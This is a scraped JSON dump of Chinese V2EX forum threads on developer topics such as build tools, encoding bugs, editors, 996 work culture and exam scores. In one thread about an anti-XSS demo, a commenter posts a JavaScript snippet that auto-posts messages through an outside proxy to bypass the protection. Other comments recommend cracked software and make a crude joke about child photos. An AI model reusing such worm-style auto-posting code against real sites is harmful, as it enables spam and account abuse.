href=\"http://www.xmake.io/#/zh/\" rel=\"nofollow\">文档</a>，提供更加完善的文档支持</li>\n<li>增强<code>os.run</code>, <code>os.exec</code>, <code>os.cp</code>, <code><a href=\"http://os.mv\" rel=\"nofollow\">os.mv</a></code> 和 <code>os.rm</code> 等接口，支持通配符模式匹配和批量文件操作</li>\n<li>精简和优化构建输出信息，添加<code>-q|--quiet</code>选项实现静默构建</li>\n<li>改进<code>makefile</code>生成插件，抽取编译工具和编译选项到全局变量</li>\n</ul>\n<h3>Bugs 修复</h3>\n<ul>\n<li><a href=\"https://github.com/waruqi/xmake/issues/41\" rel=\"nofollow\">#41</a>: 修复在 windows 下自动检测 x64 失败问题</li>\n<li><a href=\"https://github.com/waruqi/xmake/issues/43\" rel=\"nofollow\">#43</a>: 避免创建不必要的.xmake 工程缓存目录</li>\n<li>针对 android 版本添加 c++ stl 搜索目录，解决编译 c++失败问题</li>\n<li>修复在 rhel 5.10 上编译失败问题</li>\n<li>修复<code>os.iorun</code>返回数据不对问题</li>\n</ul>\n</div></div>"], "reply": "5", "tittle": "xmake 新增对 golang, dlang, rust 的构建支持", "comment": ["看了下主页，似乎是 markdown 本地解析？", "原来是 docute ，涨姿势了～", " 是的 很不错的文档工具。。", " 为你的作品点个赞，改天试试～", " 谢谢支持"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>实际效果</p>\n<p><img alt=\"\" src=\"https://ww1.sinaimg.cn/large/006tNbRwgy1fdbs1zgu62j30el08vdge.jpg\"></p>\n<p>想要的效果</p>\n<p><img alt=\"\" src=\"https://ww1.sinaimg.cn/large/006tNbRwgy1fdbs2o92voj30kc0dg3ze.jpg\"></p>\n<p>弄了好长时间没弄出来 发邮件给 jetbrains 了</p>\n</div></div>"], "reply": "14", "tittle": "Webstorm/PhpStorm: Select specific font from a Font Family", "comment": ["不懂，你在表达什么", "这种就设置一次又不是每天的 routine 你至于纠结成这样吗？", "上面那张图不是也有这个 checkbox ？", "好吧，我来翻译：我要的是该死的极细 source code pro 字体。为何 jet brain 字体下拉列表没有提供？\r", "\r", "（希望你不是字体没装好……）\r", "（你那个红框可以去掉吗？）", " #3 今天想换个 Source Code Pro ExtraLight 结果死活只有 Source Code Pro 这一个字体可选(默认的显示太粗了)，谷歌了好长时间 在老外博客上看到这个截图了 照做了还是没出来。", " #4 这标题不错 哈哈哈 折腾好长时间了 算了 就这样用吧 ", " ", " 我的 Webstorm 里面就有具体的字体，截图： ", "\r", "\r", "不过 source code pro 确实只有一个（ Word 里面显示有几种 source code pro 变体）。感觉是这个字体自己的问题。", " 告诉你一个不幸的消息……这个字体有……这是和 source code pro 没有放在一起……你再仔细找找。", " 刚才那个链接我又上传了一张截图…… Extral Light 也是有的。", " \r", "我还安装了 FiraCode 、 Operator Mono 、 PragmataPro\r", "这几个字体也只有一个\r", "明天去公司找一台新 Mac 在测试安装下 \r", " ", " ", " 你再仔细看看是不是只有一个。我发现我的不止一个。只是字体没有按照字母排序……没有放在一起，而已。", "最前面的字体是你用过的字体，从 A 排序的才是系统字体表，可以按键盘上的字母快速定位到以此首字母开头的字体列表那。不显示去系统字体那里看看字体是不是被隐藏了", "\r", "呃，我不知道这样算不算打脸 2333\r", "其实只要往下拉就能看得到的，不是没有，哈哈哈\r", "楼主心态太焦躁了啦", "字体我只用 Mocano"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我在本地搭建 wamp 测试环境， mysql 设置 utf8_general_ci 前端显示正常，可是使用阿里云的 windows 2008 ECS ， IIS7+MYSQL+PHP+APACHE ，编码也是设置 utf8_general_ci ，这个字母é 就显示乱码 chass�了，此乱码显示在 url 中具体为：%EF%BF%BD. 百思不得其解，各种编码什么 gbk ， utf8mb4 都有尝试，还是如此，请问如何破解？</p>\n</div></div>"], "reply": "11", "tittle": "é 这个法文字符 在阿里云 ECS 上显示为乱码， mysql 设置为 utf8_general_ci", "comment": ["注音符诶", "试一下先 encode(latin-1)再 decode(utf-8)", "mysql 查询前 mysql_query('set charset=utf-8')", "server 和 client 都有编码，都要设置。你所说的“ mysql 设置 utf8_general_ci ”，设置的哪个的编码？", " php 里面没有 encode 函数吧？我使用 urlencode 然后 urldecode 也不行", "  服务器里面 mysql 数据库编码设置的 utf8_general_ci ，程序也设置了 header(\"Content-type: text/html; charset=utf-8\"); 依然不行", "拉丁字母é的 utf-8 的编码是 C3A9,对应 url 的\r", "utf8 percent encoding 不可能是三字节阿。", " 看来你客户端没设置编码。你设置的那是 HTML 编码，不是 MySQL client 的编码", " 那这个应该怎么设置？", "  是 这个字母对应的编码应该是 C3A9 ， url 里面那个是乱码对应 url 编码", " 如 3 楼所示， php 里，建立 mysql 连接的相关代码，显式设定连接用编码是 UTF8"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>i7 处理器\n256SSD   1T 硬盘\nGTM960 2G 独显\n15.6 英寸 IPS 屏</p>\n<p>入手 7200 ，现价处理 3000</p>\n<p>有要的 qq339571206</p>\n</div></div>"], "reply": "14", "tittle": "仅北京交易，机械革命 MRx6", "comment": ["有没有人要\\(^o^)/~", "这么便宜。。。有其他毛病吗？", "同问  为啥这么便宜", "这么便宜，我的天", "二手的啊 没有破损", " @", "  用了一年不到 现在想卖了 买个新版的额 macpro", "没有一点毛病", "卧槽，出外有意。", " 有意？", "面交是硬伤 不然就秒了", "秒价，可惜不需要", "最好上个娱乐大师截图吧！", "有意", "价格可以"]},
{"content": ["<div class=\"topic_content\">要求如下：\r<br>1.所见即所得的，让不会 HTML 的人也能写 HTML\r<br>2.如果该软件能跨平台那最好了\r<br>3.界面越简单越好</div>"], "reply": "15", "tittle": "求推荐一款本地 HTML 编辑器", "comment": ["frontpage", "atom", "dreamwaver", "dreamwaver", " ， ATOM 可以所见即所得？？？？？", "adobe 的 brackets", " ,adobe 的东西尽量不碰，这么简单的需求就没有一个免费开源工具么？", "word 另存为网页", " ,可以但有点大材小用", "frontpage +1", "sublime", "bluegriffon", "webstorm", " ,满足要求，试用了一下，基本功能都有。", "dreamweaver\r", "\r", "还自带 bootstrap 可视化编辑布局， bootstrap 模块的组件直接拖出来用，用了都说好。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"http://www.etherdream.com/FunnyScript/anti-xssworm/\" rel=\"nofollow\">http://www.etherdream.com/FunnyScript/anti-xssworm/</a></p>\n<p>游戏规则：在控制台里编写代码，若能自动发出留言，就算成功。</p>\n<ul>\n<li>\n<p>控制台必须是那个页面的 top 环境。（模拟页面中的 XSS 运行）</p>\n</li>\n<li>\n<p>发表过程自动完成，不能有用户交互。（想象 XSS 自动发留言导致蠕虫）</p>\n</li>\n</ul>\n</div></div>"], "reply": "10", "tittle": "一个防 XSS 自动发留言的演示，看看你能不能绕过~", "comment": ["```\r", "(function(img){\r", "  img.onload = updateList\r", "  img.src='https://xqin.net/temp/anti-xssworm.php?c=test_' + Math.random()\r", "})(new Image())\r", "```\r", "\r", "这样的算吗?", " 后端代理应该不能算~ 这个案例只是为简单，所以不用登陆也可以发表。一般应用都是需要登陆的，代理是不知道用户 token 的。", "`游戏规则：在控制台里编写代码，若能自动发出留言，就算成功。` 不是符合了上面的规则了吗? 又没说不让用后端中转.\r", "\r", "那个 DEMO, 利用 跨域 隔离运行环境, 从 js 层面想触发 click 是不可能了(只能用户主动点), 并通过 `message` 事件来进行交互.", "话说楼主咋换头像了呢 :P", " 没有换啊。。。应该是被和谐了。。。", "好吧，我再加个需要登陆的机制。。。不过这样后端还是可以自动发的。\r", "\r", "我想想，改下游戏规则。用 clickjacking 也算，但也不能太容易", "这也叫防 XSS ？？？", " 防自动发留言", "试了一下:\r", "iframs = document.getElementsByTagName('iframe')\r", "然后 iframs[1].src = '", "' (0 也可以。)\r", " 是个用 flask 搭建的页面，页面就是用 python 请求发消息的地址:\r", " ，然后就可以发了。\r", "\r", "呃，不知道这样可不可以。", " 这和 1L 是一样的，用代理发送"]},
{"content": ["<div class=\"topic_content\">从上午 10 点吵到下午 5 点，真的是精！力！十！足！  我已经把耳机音量弄的最大了 还是于事无补，时不时还往我的工位丢个僵尸 兔子 飞机啥的...哎 都是领导的还是 我说也不能说....我该怎么办 我也很无助啊(´°̥̥̥̥̥̥̥̥ω°̥̥̥̥̥̥̥̥｀)</div>"], "reply": "57", "tittle": "公司 996 每到周六的时候总有人带小孩过来,一来就 3、4 个 感觉跟开了游乐场一样...", "comment": ["v2 识别的这两个 tag 有点喜感", " 哈哈哈哈哈 我也发现了", "按照 V2 的意见套路， 996 ？！离职！！！神马？还有小孩子过来吵闹？？马上离职！！！", "陪伴家人还不如没人性的公司重要？", " 据我们 ceo 的话来说 北京大部分互联网公司都 996 我们不 996 就是不符合潮流...", " 潮流？你让他出统计数据。然后再跟他讨论讨论北京大部分公司是怎么干活的。还可以讨论一下全国拿你那个水平工资的人是怎么干活的。", "原来我呆的公司是个另类", " 领导说这个话是想让做员工的开心一点，给员工提供一个自我麻痹的台阶下。实际上领导／老板们要 996 ，还能不 996 么？", " 能啊。炒了他们就可以啦。", " 一个帖子创造了两个全新的 tags ，我服", "你也可以带一个来", "v2 主要负责劝离职", "这 TAG ，猛一看还以为眼泪流到下面帖子了，还在纳闷论坛功能不知不觉就日新月异了。。。", "领导加班都知道和家人在一起，不知道你这个员工是怎么想的。讲真，真不要把这些公司惯着了。我不像其他 V 友只会打嘴炮，之前公司说涨 50%工资实行 996 ，我毅然决然的拒绝了", "码农们应该团结起来坚决抵制 996 ，不用拼加班才有老码农的活路。", "一分钟班都不加的人，看了 v2 都不敢跳槽了", "现在真心觉得 996 就是反人类啊！！！相当于没有自己的私人时间了，想下班去打个球，逛个超市，给孩子讲故事的时间都没有了", "估计 v2 无子化，丁克几率暴涨", " \r", " \r", " tag 已经看不到了，请问是哪两个？", "不容易啊，拖着孩子一起来加班，都是 996 惹的祸，理解一下……", "能把工作区搞成生活区的公司，也没谁了吧...", "？？？没遇到过 996 公司", "与其怨天埋人，还不如自己解决 6 这个问题", "不谈 996 的问题，如果你的上级都同意带孩子加班，你是没什么办法的，闲吵加耳塞吧，别开大听音乐，长时间伤害听力。", "带个女朋友来加班秀恩爱，胆子够大就打真军，没有女朋友就去点一个失足", "是时候入个降噪耳机了🤣", "怎么加薪不是潮流，加班却是潮流呢？", " 边这么想,边往下翻,准备这么回...", "建议入手抗噪耳机\r", "反映问题，孩子找人统一看护吧 \r", "如果都无法解决  那就说 周六无法专心上班  让领导看着办吧", "你也带孩子过来吧，没有孩子带女友也行啊", "过来人提醒楼主一句，过大音量的耳机对听神经的损伤是不可逆的，尽早换个隔音的好耳机吧", "耳机是没用的，买个耳塞吧，淘宝上几毛钱一个。", "不要长期佩戴耳机，尤其是大音量，我现在已经被耳鸣困扰，两千买的耳机，半年多没干戴了", "哈哈，孩子的精力确实非常旺盛，尤其是两三周岁的小孩子。", "论降噪耳机重要性。", "带孩子来的同事说：我也很绝望啊", "你不觉得这是家长对 996 的一张抗议嘛，所以说呢，你就当作周六加班是和小朋友玩好了。", "吧加班当成了习以为常，却不反抗", "这时候你需要买个 QC35", "真是什么奇葩的事都有，心疼楼主", "混 V2EX 都是 557,赶紧跳槽吧，我 557 都嫌弃多，好想像公务员，一个月上七天班！", "加班我倒不反感，小公司氛围很好，同事开开玩笑出去吃个饭还挺开心的，但是弄一帮熊孩子来捣乱就不爽了。", "都是九九六，\r", "相煎何太急！", "这个简单，楼主没事弄点暴露的儿童照片，假装不小心被领导看下，我保证以后他们肯定不敢让熊孩子靠近你。\r", "\r", "说正经的，我认为什么 996 并不是重点，就是缺乏教养，我们 boss 孩子平时也会来公司，但是绝对不会打扰到员工。所以这事就是要么狠要么忍要么滚。", " 557 不会猝死吗？", "一直好奇，啥叫互联网公司？", " 是啊是啊", "r#44 @", " 儿童色情，被投诉当心丢工作啊", " 你没看到他是 “一个月上七天班！”吗 😂", "Bose QC35", "周六还要上班？？？", " HI", "  - -996 工作制。。。特苦逼", "你应该去吐槽公司制度，幼儿园周六休息，而你们公司还要求员工上班，人家带着孩子来上班已经非常敬业了。等你有了孩子就明白了，别说你是丁克", "我感觉 你在 6 的时候 也玩玩就是了。", "离职，下一题。", " 说错了，俺们是 775"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>各位老大好，小弟自初三缀学以来，自己学习了网页设计（前端的），后来又接触了建站工具，主要用帝国套站。现在深知要想自己能够学会开发并能找到稳定高收入的工作，必须要学好编程。但是我零零散散的接解 PHP 也有三四年了，现在 21 了。一直没有找到好的学习方法。现在还没看到 MYSQL 知识。可能是浮躁和对未来的迷茫吧。自从辞职以来，自己接些小单，算了下月薪平均才 2K,很是苦逼。又不能到大城市工作，因为都有学历限制，只能呆在家。但是我真的很是向往大城市的生活，不想到 30 了还呆在个小县城。各位大哥大姐帮帮我吧。</p>\n</div></div>"], "reply": "7", "tittle": "小白求带，想学习 PHP ，有什么好的学习方法呀？", "comment": ["这头像，我以为是群里的一位用户。", "我想问题主接的单是做什么的，在哪里接的。。", "小兄弟，建议你还是自学去考个大学吧。。。", " 先加我们的 python 群吧，里面有些会 PHP 的，人多后可以分出来专门的 PHP 群，这样效率更高，这个群是一群工程师组建的面向初学者的 python Linux 学习群， qq 群号： 278529278 ，非商业性质，拒绝广告，只接收真正想学这方面技术的朋友，交流学习，申请请说明来自 v2ex", "我的建议是: 学习\r", "\r", "用学习来获得学历, 或者用学习来弥补学历,不要再用「没有好的学习方法」来欺骗自己\r", "\r", "现在网上的教程很多,用来入门是很足够的.\r", "\r", "行动起来吧,加油!", "零零散散接触 PHP 三年，还没看到 MySQL...\r", "我的建议是你先从头看 PHP ，学到 MySQL 的时候再来问吧…", "谢谢各位前辈的指点"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><ol>\n<li>很多同事其实与你是弱工作关系。 Redmine 是否已有类似， [关注 /收藏列表] 的插件 /功能。每次指派进我只需要从这个列表中选就可以了。</li>\n<li>能否从项目管理角度思考，是否有更好的组织架构。\n<img alt=\"Alt text\" src=\"http://thumbnail0.baidupcs.com/thumbnail/e3f911aa045f31cf7f43b1546cbcb72e?fid=3406757817-250528-158610151616173&amp;time=1488700800&amp;rt=sh&amp;sign=FDTAER-DCb740ccc5511e5e8fedcff06b081203-tYAYLr8nItsKdNOnLlC1ZZ1B4sY%3D&amp;expires=8h&amp;chkv=0&amp;chkbd=0&amp;chkpc=&amp;dp-logid=1476711753113202007&amp;dp-callid=0&amp;size=c710_u400&amp;quality=100\"></li>\n</ol>\n<p>列表太长，看到眼都花了！\n大家有什么建议么？</p>\n</div></div>"], "reply": "8", "tittle": "Redmine [指派人] ，从很长的人名列表中，找出我要的。看到眼到花了！非常痛苦！大家有没好办法？", "comment": ["尝试自己撸个猴子教本？", "姓名前加上小写字母 ， 下拉列表就可以直接按键盘快捷键了，试试看，非常好用", "自己定制下，可以是只是项目中的人，另外加上搜索，体验就没有什么问题了", "把 select 加个 js \r", "\r", "让列表变小嘛，有个著名的两张 pizza 的论调。", " 可以！:+1:", " 不错的想法", " 可以。谢谢"]},
{"content": ["<div class=\"topic_content\">现在的前端 mvvm 框架比如 vue.js angular.js 做的事情太多了，我发现很多前端程序员也只会做数据双向绑定，能玩的溜的一个是比较少，二个是比较贵\r<br>\r<br>那么有没有一个简化的库，只做这一个事情的呢？</div>"], "reply": "15", "tittle": "有没有只做数据双向绑定的前端框架？", "comment": ["jq 有个只做 binding 的模块。或者自己写也可以，不过只是把别人做过的轮子再做一边。不知道答主是希望简化到什么地步，因为其实 vue 的数据绑定是很简化的了，都是为了被数据驱动写的。", " 我的意思是， vue 和 angular 功能太多了，他们的数据绑定是简单，但是如果只用这些功能有点大材小用，但是又很难找到用的溜的前端。所以想找个只做双向绑定的库。", "KnockOut", "双向绑定只是一个功能，没法组成框架， google 发现有个叫 way.js 应该可以实现楼主想要的功能\r", "另外有提到贵是指什么意思呢？", " 就是工资高啊，没有别的意思，就是想降低成本。", "vue.js 我觉得你可以只用来数据双向绑定", "安利一下 Ace\r", "\r", "我学习的第一个前端框架 ", "北京前端求职的感觉挺多的，招一个应该比较轻松吧", "有啊， jquery 有个插件就是这样", "rivet.js 官网地址： ", " \r", " \r", "不是前端工程师，以前会 jQuery 。这两天用了一下 Vuejs 和 angular2 ，感觉太重太跳跃，毕竟以前手写。。这两年前端发展太快", " 确实只做一件事情。", "单纯的数据绑定很简单，想要自己写", "喜欢 jquery 的可以试试这个， "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>小团队使用，最好是容易安装，界面清爽，哪款比较好？</p>\n</div></div>"], "reply": "36", "tittle": "大家公司都用哪款 code review 工具，有推荐的么", "comment": ["Visual Studio Team Services", "phabricator", "git+gerrit", "Visual Studio 有款插件 Review Assistant 我觉得不错，虽然我只用它来做代码非侵入式注释~", "ReviewBoard", "fisheye", "beyond compare", "我歪楼一下，团队成员不愿意 review 怎么办？", "beyond compare +1", "BitBucket", "phabricator +1", "GitHub Enterprise", "git+gerrit", "只用过 gerrit", "真好也在考虑这个问题，也没有想好用什么合适。", "r#8 @", " 说明团队成员对代码充满自信 ", " ", "tig", "我说 gitlab 会不会被打", "GitHub", "phabricator 不过其它功能略多", "sonarqube", "GitLab + SonarQube ", " ", "与楼上的 gitlab + sonarqube 一样", "gerrit", "svn ReviewBoard\r", "git  BitBucket", "Phabricator", "phabricator", "phabricator 或 gerrit", "记事本😂", " 不会被打，但是逼格太低，会被鄙视。", "Gerrit +1", "phabricator +1", "Upsource 破解版你值得拥有!", "SonarQube", "我司一群工作不饱和的自己写了套...", "TFS"]},
{"content": ["<div class=\"topic_content\">大二学生，去年 12 月第一次考英语六级  450 请问各位需要刷高分吗？\r<br>在找实习或者找工作中对英语考级成绩的要求是怎么样的？\r<br>谢谢！</div>"], "reply": "62", "tittle": "英语六级需要刷高分吗？", "comment": ["不需要，雅思高分才有用。", "个人觉得不需要。我六级分数不低，在简历上都没提，企业似乎也不在乎", "雅思刷了三次的路过。现在看来对往后工作没用，但可以当作继续学习英语的动力。", "感觉现在四六级越来越水了…又在推广他那个口语考试… SET\r", "我本来也打算刷分的，后来什么都没看就又去考了，居然比上次还要好点…\r", "程序员的话我感觉只要不惧怕英语就可以，毕竟要看一些文档，视频，为了分数单纯刷分没啥意思。", " #3 更正，是六级。", "虽然楼上都说没什么用。但是，刷分也没啥损失啊。有时间就刷，以考促学总是好的。", "刷呗，反正偏宜", "每次考六级都赶上期末考试，没心情考。。。最后就 500 出头。\r", "\r", "不过确实没用，简历上最多提一下有六级证书", "每次都裸考，大概知道自己每部分能得多少分，就把分数卡在 400+但是没过 426 ，考了四次六级也没过，每次看到分数都会想自己是不是有病。我可是要集齐 7 张六级准考证的男人 233", "能刷就刷，也没坏处", "保研可能有用，其他基本没用", "没什么必要，工作的话一般要求能阅读英文文档就行了", "能刷就刷", "有证就行，到底啥水平一聊就知道了", "六级刷了一次接近 600 的告诉你没用。参加英语竞赛也没用。", "这么便宜不考白不考", "主要是自己的听说读写能力，别的都是其次。", "要，逆水行舟，如果不刷你接下来就不会学英语了…", "刷分没损失？不敢苟同\r", "除非有明确需求，否则刷分损失的就是时间\r", "工作越久，责任越重，越会感觉当初拿去做无意义的事情浪费掉的时间越多", "没用 雅思托福才有用", "没必要吧。好像没人问过我六级多少分。\r", "何况六级高分还是靠练的，我第一次接着四级考，认真做了几套题，有五百多，第二第三次裸考都是四百多（过线），最后还来一次报名了没去考。", "过了就行了 当然你要是考个 600 还能吓唬下没见过世面的", "考了四次四级都没过………妈蛋，不考了。", "好像很少有人关心多少分的", "保研有用", "有时间就刷吧", "分数不需要刷高分，但英语一定要学好。\r", "听，说可以差一点，但读写得加强，这是区别于一般程序员的能力。", "英文水平的收获是自己的…", "所谓的刷分没损失 是   你裸考  这是刷分没损失\r", "\r", "\r", "我两次裸考六级，第二次比第一次高了 90 分（逃", "有那时间还不如刷雅思", "当年 6 级 60.5 分通过，分数过多少没关系，关键是过", "看岗位吧，多数岗位没用。如果需要兼职翻译帮汉化可能会想起你，也不一定算好事。如果是市场，商务或者产品有点用，毕竟有可能需要沟通或者了解国外情况。", "目前为美国某创业公司远程工作中，表示考了次 4 级连 500 分都没过， 6 级懒得去考了。\r", "表示找工作的时候，看到过个别外企要求过 4/6 级，其他并没有要求。我现在和歪果仁英语书面交流无障碍，就是没过 6 级，不过我口语和听力还是跟不上。感觉对程序员来说，实用才是最重要吧。找工作 4 6 级不重要，重要的是毕业证含金量，名校毕业证和二流大学的质上不一样，国内竞争大，毕业证不行，连机会都没有，能力有屁用。", "6 级分数真的有用吗，大二完全没复习裸考 600 差一点，刷分有什么用啊", "读研的话似乎很多学校六级分数高可以免修英语。\r", "出去的话不清楚，毕竟我还没毕业。", "工作中使用英语，和学习技术中使用到英语，和考 46 级的分数，基本上没有什么关系，及格了就够用了。", "雅思 7.5\r", "感觉没卵用，投实习都没人看中的感觉", "够用就行了", "真正要你用英语的工作，四六级水平应该远远不够吧？", "如果你的第二专业是英语，那么考专八的前提是六级 600+。 除此之外，别无他用。六级并不能练英语，我没有花过一分钟在准备这种资格类考试上。", "不如考雅思，顺道考个 6 级-。-", "不需要 6 级根本没什么用", "个人看法：英语能力很重要，六级只是考察了部分英语能力。", "找工作实习什么的可能用处不大，但是如果保研的话，部分学校六级成绩超过某个线可以免修研究生英语，这还算有用吧", "六级唯一的用处就是决定会不会被简历筛选规则刷掉，所以过了就行。考个 600+多 HR 眼睛也就多停留零点几秒，还不如加托福或雅思。", "个人觉得四六级考的词汇在国外永远也不会用到，比如翻译共同富裕，国外常用的很多词四六级不考，比如 gotcha 等", " 我觉得大家如果跟楼主说刷分浪费时间，最后楼主就变成了六级不刷，多下来的时间也不会去做啥别的有意义的事……", "六级需要过 但是高分不必", "正确的逻辑：提高英语能力附带导致考试成绩提高。没听说哪个企业要求英语成绩必须过哪条线吧，学校是有要求，但那是 TOEFL/GRE 。而且所谓刷分也大多是研究这个考试的“漏洞”而不是语言本身，文字和语音输入量足够后，影响 CET 成绩的就是即使直接给出中文都无法理解的出题人逻辑了……（裸考 600 多，可能有所偏颇）", "大型装逼现场", "如果有能力考个更高的分数,那就考吧!", "我越刷分数越低", "六级才 450 ？\r", "\r", "\r", "但是没必要刷。没卵用。", "刷吧，不刷就没动力学英语了。。。", "有能力肯定刷啊！现在这个社会啊，你机会去显摆自己能力时，就必须要显摆。否则等你过了这个阶段，就没机会了。", "没必要特意去「刷分」，但追求高分的过程中也提高了英语能力，何乐而不为？", "嘛。我是觉得过线就好，没必要特别刷，有这个时间不如刷个雅思托福", "就保研直博之类的有点用 找工作没啥用吧", "刷吧,一路刷到 592 的路过,反正一年才考两次", " 远程工作不需要口语交流的吗? 之前找过，遇到这种问题。请加个 QQ 聊一下吧，谢谢 ◉‿◉。 714645019", "6 级刷高了会说么？", "考了一次 420 就溜了!"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>transition 在页面重新加载的时候会执行过渡<br>\n怎么阻止加载时的过渡？</p>\n</div></div>"], "reply": "1", "tittle": "transition 属性在页面加载的时候就会运行一次？", "comment": ["在页面加载的时候如何阻止 css 中 transition 执行？"]},
{"content": ["<div class=\"topic_content\">之前用的.css(\"color\",\"十六进制\")但是做判断的时候浏览器读出来的是 rgb （???,0,0 ）格式，所以我试图改成 hasclass 方法，但是也遇到了瓶颈，本人新手勿喷。\r<br>求大神提点代码如下：\r<br>&lt;!DOCTYPE html&gt;\r<br>&lt;html&gt;\r<br>&lt;head&gt;\r<br>&lt;meta charset=\"utf-8\"&gt;\r<br>&lt;title&gt;webapp&lt;/title&gt;\r<br>&lt;script src=\"http://apps.bdimg.com/libs/jquery/2.1.1/jquery.js\"&gt;&lt;/script&gt;\r<br>&lt;/head&gt;\r<br>&lt;body&gt;\r<br>&lt;script type=\"text/javascript\"&gt;\r<br>$(document).ready(function(){\r<br>$(\"button\").click(function(){\r<br>if($(\"[id='cha']\").hasClass(\"text2\")){\r<br>$(\"[id='cha']\").removeClass(\"text2\").addClass(\"text3\")\r<br>}\r<br>else ？？？\r<br>})\r<br>});\r<br>&lt;/script&gt;\r<br>&lt;style&gt;\r<br>.text2{\r<br>color:#AA0000;\r<br>}\r<br>.text3{\r<br>color:#55BB00;\r<br>}\r<br>&lt;/style&gt;\r<br>&lt;p class=\"text1\"&gt;hello world&lt;/p&gt;\r<br>&lt;p id=\"cha\" class=\"text2\"&gt;im guy&lt;/p&gt;\r<br>&lt;button type=\"button\" &gt;change\r<br>&lt;/button&gt;\r<br>&lt;/body&gt;\r<br>&lt;/html&gt;</div>"], "reply": "4", "tittle": "[jquery 提问] 实现一个 button 对同一个文字的两种颜色切换。", "comment": ["else 里面写 “ $(\"[id='cha']\").removeClass(\"text3\").addClass(\"text2\") ” 不就能完成功能了吗？\r", "\r", "另外提几点小建议：\r", "1. style 标签应该放在<head></head>里面\r", "2. script 标签最好放在<body></body>里的最后", "给个我的思路, 让按钮的默认颜色是 a, 添加个 class 颜色是 b, 在点击时使用 toggleClass('b')来切换颜色, 岂不是很方便?", " <body>\r", "<script type=\"text/javascript\">\r", "$(document).ready(function(){\r", "$(\"button\").click(function(){\r", "$(\"[class='text2']\").toggleClass(\"text3\")\r", "})\r", "});\r", "</script>\r", "<style>\r", ".text2{\r", "color:#AA0000;\r", "}\r", ".text3{\r", "color:#55BB00;\r", "}\r", "</style>\r", "<p class=\"text1\">hello world</p>\r", "<p class=\"text2\">im guy</p>\r", "<button type=\"button\" >change\r", "</button>\r", "</body>\r", "我试图这样写，但是只能切换一次，再也切不回来了", "难道不应该用 jquery 的 toggle 来实现么。。     不就是 点击按钮 然后切换同一个 dom 中字体的两种颜色么。。"]},
{"content": ["<div class=\"topic_content\">有用 protonmail 的嘛</div>"], "reply": "2", "tittle": "QQ 邮箱发来的邮件都被 protonmail 归为 Spam 了", "comment": ["ProtonMail （在中国被非正式地称为“质子邮箱”）是一个加密的 webmail 服务，于 2013 年由欧洲核子研究组织（ CERN ）成员 Jason Stockman 、 Andy Yen 和 Wei Sun 创建。 ProtonMail 现由总部设在瑞士日内瓦州的 Proton Technologies AG 经营。据 Andy Yen 称，他和公司一半的人都来自麻省理工学院（ MIT ）， ProtonMail 的两个服务器分别设在瑞士的 Lausanne 和 Attinghausen 。\r", "\r", "高级。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近在写一个个人的博客!作为学习记录和学习中所感所想记录!后台的编辑器 v 友们推荐用哪个好啊 知道的有百度编辑器和 Markdown!</p>\n</div></div>"], "reply": "102", "tittle": "求 v 有推荐好用的编辑器", "comment": [" 我刚才可能没说清楚, 但是 org mode 是我见过最好的了\r", "\r", "使用效果可以参考 youtube 上的视频", " 使用指南 /\r", "我配置的，可以凑合用"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>https://ooo.0o0.ooo/2017/03/06/58bcf98597c02.png</p>\n<p>工资不比这个高，以 Java 招聘入职的，为事业单位做了项目，说实在在前端没少费心思 帮很多同事解决了前端兼容性和 BUG 解决，但一直保持低调的态度。最近发现公司在招聘前端， 6k-8k ， 觉得自己明明可以拿更高或更多的工资，但公司根本不重视一线员工也不提倡内部人选。</p>\n<p>最近 1 年在玩 C# .Net Winform 都玩的还可以 挣了不到 10k 做过自助机软件，发卡系统，电子商务网站。</p>\n<p>一开始本着在这里能为国家信息化工作做一点微博之力还算荣幸，现在想想，这一年并未实现自己的价值，公司也把原本软件研发部门的我们改成了技术支持部，感觉公司这样做几乎是要毁了很多人的一生，我们到现在拿着死工资却未实现自己的本职工作，拥有比一般同事好的前端技术却不被重视，貌似凡事为公司创造了利润 就只有领头的人拿钱，底下的最多最多吃一顿饭 ，所谓赏罚分明根本就是渣渣 公司越来越壮大，却忘掉了最初的我们。</p>\n<p>所以决定要近期离职，要不是被逼无奈恐怕也会像其他人一样在这里养老。</p>\n<p>决定花两年时间帮亲戚一起料理家里的事业 如果家里事业做大 自己的压力会小很多 在期间继续接单做生意（想想有时候一两单就挣出一年的工资也还不错）</p>\n</div></div>"], "reply": "13", "tittle": "在事业单位做事的程序员，想另谋高就，发现了自己单位在招前端", "comment": ["全是压力带来的心里话 望大家提出些建议", "真巧，我也是石家庄的...已经基本放弃回去做程序员的想法。", "10k 写错了 没那么少", " 你从事哪门语言 在哪工作？", " 前端 北京", "技术好可以拿更多的钱，为什么不呢。单位不重视技术罢了，钱也不给足还坚持做什么。想想高房价，再想想工资(虽然工资高也买不起房)\r", "离职的话，下家要找靠谱的，钱拿足了，有年终奖的。", "同在事业单位，同打算跳槽。工资对得起上班时间，但内部关系套路不能忍。", "事业单位是搞关系的地方", "话说这家科技公司也算事业单位吗？", " 不好意思 没说清楚 我们属于这家公司的，在事业单位属于外聘", "同样在事业单位做事，感觉跟楼主际遇差不多", "事业单位搞关系，科技企业搞技术", "讲个笑话，我们市的一所重点高中，直到今年年初食堂还在使用饭票，嗯，就是一张一张撕下来往钉子上戳，考勤全靠人工查岗，工资外收发只用现金。今年新校长上任了，食堂刷卡了，考勤刷脸了，职工收入提高了，吃空饷多年的人来上班了。更值得玩味的是在老校长离任之际食堂管理员悄然辞职 😏  这些糟心事在事业单位里太多了，离职也好"]},
